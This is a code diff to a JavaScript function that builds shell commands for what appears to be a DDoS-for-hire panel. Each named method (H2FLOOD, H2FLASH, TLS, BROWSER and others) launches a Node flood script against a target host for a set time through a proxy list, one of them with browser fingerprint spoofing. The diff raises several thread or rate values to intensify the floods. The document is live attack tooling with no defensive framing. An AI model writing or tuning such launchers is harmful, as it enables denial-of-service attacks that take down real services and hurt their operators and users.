@@ -30,11 +30,11 @@ const generateCommand = (method, host, port, time) => {
         case 'H2FLASH':
             return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
-            return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
+            return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 90 4 proxy.txt`;
         case 'H2MIA':
             return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
-            return `cd /root/methods && node Vzy.js ${host} ${time} 64 4 proxy.txt`;
+            return `cd /root/methods && node Vzy.js ${host} ${time} 90 4 proxy.txt`;
         case 'MIAMIX':
             return `cd /root/methods && node MIXMAX.js ${host} ${time} 8 4 proxy.txt`;
         case 'TLS':
@@ -46,7 +46,7 @@ const generateCommand = (method, host, port, time) => {
         case 'BROWSER':
             return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint advanced`;
         case 'H2NEYLI':
-            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 10 proxy.txt`;
+            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 4 proxy.txt`;
         case 'MIXBIL':
             return `cd /root/methods && node MIXBIL.js ${host} ${time} 32 4 proxy.txt`;
         case 'RAW':
